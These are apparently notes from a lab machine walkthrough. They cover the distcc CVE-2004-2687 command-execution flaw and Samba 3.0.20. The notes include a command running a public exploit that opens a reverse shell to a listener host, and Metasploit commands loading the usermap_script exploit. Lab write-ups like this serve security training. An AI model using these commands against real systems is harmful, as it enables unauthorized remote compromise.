### Searching for Exploits


Nmap flagged CVE-2004-2687


**Vuln Details:**

Reference https://www.cvedetails.com/cve/CVE-2004-2687/

```txt
distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks. 
```

![[vuln-details.png]]


**Exploit Code:**

Reference: https://github.com/k4miyo/CVE-2004-2687/blob/k4miyo/CVE-2004-2687.py

Changes to the exploit code were not made

Running the xp code

```bash
python3 CVE-2004-2687.py --rhost 10.10.10.3 --rport 3632 --lhost 10.10.14.12 --lport 4321
```

![[pop shell.png]]

 OS: Unix (Samba 3.0.20-Debian)
 
 ```bash
 searchsploit samba 3.0
 ```
 
 ```bash
 Samba 3.0.24 (Linux) - 'lsa_io_trans_names'  | linux/remote/16859.rb
 ```
 
 ```msfconsole
 search samba 3.0
 use exploit/multi/samba/usermap_script
 set RHOSTS 10.10.10.3
 ```
 
 
 Options should look like the following (change LHOST if needed):
 ![[msf_options.png]]